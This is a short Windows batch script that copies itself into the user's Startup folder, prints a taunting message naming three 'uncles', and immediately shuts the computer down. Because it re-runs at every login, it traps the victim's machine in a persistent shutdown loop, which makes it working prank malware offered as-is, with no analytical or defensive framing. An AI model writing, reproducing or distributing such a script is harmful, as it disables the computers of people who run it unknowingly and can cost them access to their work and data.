@echo off
set STARTUP=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

copy "%~f0" "%STARTUP%"

echo You are alwyas controlled by your uncels (Shamlan, Shehab, Yahya (DUH))...

shutdown /s /t 00

pause >nul
